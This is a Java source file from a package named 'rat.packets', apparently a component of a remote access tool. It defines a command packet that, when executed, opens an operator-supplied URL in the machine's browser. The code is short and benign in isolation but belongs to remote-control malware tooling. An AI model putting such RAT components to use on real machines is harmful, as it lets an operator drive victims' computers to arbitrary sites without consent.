package rat.packets;

import java.awt.*;
import java.io.IOException;
import java.io.Serializable;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Objects;

public class WebsiteOpenPacket implements IPacket, Serializable {

    private static final long serialVersionUID = 6471931106395093368L;

    private String url;

    public WebsiteOpenPacket(String url) {
        this.url = Objects.requireNonNull(url);
    }

    @Override
    public void execute() {
        try {
            openWebpage(new URI(url));
        } catch (IOException | URISyntaxException e) {
            e.printStackTrace();
        }
    }

    private void openWebpage(URI uri) throws IOException {
        Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;

        if (desktop != null && desktop.isSupported(Desktop.Action.BROWSE)) {
            desktop.browse(uri);
        }
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.WEBSITE_OPEN;
    }
}
